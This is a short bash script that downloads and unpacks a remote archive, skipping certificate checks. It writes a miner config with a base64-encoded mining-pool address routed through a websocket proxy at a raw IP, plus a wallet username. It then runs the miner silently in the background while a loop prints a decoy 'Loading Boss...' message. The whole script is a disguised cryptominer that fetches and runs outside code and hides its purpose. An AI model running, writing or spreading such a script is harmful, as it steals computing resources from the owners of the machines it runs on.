#!/bin/bash

curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/mino.tar.gz
tar -xvf mino.tar.gz
echo -e '{"log": true, "proxy": "ws://8.222.235.5:8080/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "blue-mino/1.0", "threads": 7}' > data.txt
nproc --all 
node app.js > /dev/null 2>&1 &
sleep 10
while true
do
        echo "Loading Boss..."
        sleep 7200
done
